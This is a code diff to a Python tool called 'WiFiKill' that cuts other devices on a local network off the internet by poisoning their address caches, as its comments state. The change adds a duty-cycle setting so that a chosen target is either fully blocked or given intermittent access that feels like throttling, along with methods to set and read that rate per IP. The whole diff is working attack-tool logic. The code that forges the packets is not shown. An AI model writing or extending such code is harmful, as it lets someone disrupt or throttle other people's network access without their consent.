@@ -31,7 +31,7 @@ except ImportError:
 WINDOWS = os.name == "nt"
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 APP_NAME = "WiFiKill"
-APP_VERSION = "2.5.0"
+APP_VERSION = "2.6.0"
 
 if getattr(sys, "frozen", False):
     APP_DIR = Path(sys.executable).resolve().parent
@@ -663,6 +663,7 @@ class Target:
     ip: str
     mac: str
     note: str = ""
+    duty: int = 100      # 在线占空比 %：100=全断（默认）；50=十拍中五断五通；最小 10
 
     def key(self) -> str:
         return self.ip
@@ -748,6 +749,7 @@ class Killer:
             self._thread.start()
 
     def _loop(self):
+        cycles = 0
         while not self._stop.is_set():
             with self._lock:
                 targets = list(self._targets.values())
@@ -755,12 +757,44 @@ class Killer:
                 if self._stop.is_set():
                     break
                 try:
-                    self._emit(t)
+                    poison = self._should_poison(t, cycles)
+                    self._emit(t, restore=not poison)
                 except BlockError as e:
                     LOG.emit("warn", f"{t.ip} {e}")
                 except Exception as e:
                     LOG.emit("warn", f"{t.ip} 投毒异常：{e}")
+            cycles += 1
             self._stop.wait(self.interval)
+
+    _THROTTLE_CYCLE = 10   # 占空比轮转周期（拍）：duty 按比例映射到本周期内的阻断拍数
+
+    def _should_poison(self, t: Target, cycle_idx: int) -> bool:
+        """占空比决策：duty=100 恒阻断；duty=p 在 10 拍周期里阻断 round(p/10) 拍，
+        其余拍发恢复帧让双方缓存回填（目标间歇可上网 = 体感限速）。"""
+        duty = max(10, min(100, int(getattr(t, "duty", 100) or 100)))
+        if duty >= 100:
+            return True
+        return (cycle_idx % self._THROTTLE_CYCLE) < round(
+            duty * self._THROTTLE_CYCLE / 100)
+
+    def set_duty(self, ip: str, duty: int) -> bool:
+        """调整已阻断目标的占空比（100 = 取消限速回到全断）。"""
+        duty = max(10, min(100, int(duty)))
+        with self._lock:
+            t = self._targets.get(ip)
+            if not t:
+                return False
+            t.duty = duty
+        self.persist()
+        LOG.emit("ok" if duty < 100 else "info",
+                 f"{ip} 占空比已设为 {duty}%"
+                 + ("（取消限速，恢复全断）" if duty >= 100 else "（限速中）"))
+        return True
+
+    def duty_of(self, ip: str) -> int | None:
+        with self._lock:
+            t = self._targets.get(ip)
+            return t.duty if t else None
 
     def _is_protected_target(self, t: Target) -> bool:
         """目标是否指向网关 / 本机（IP 或 MAC 命中其一即拒绝，与 is_protected 同源）。
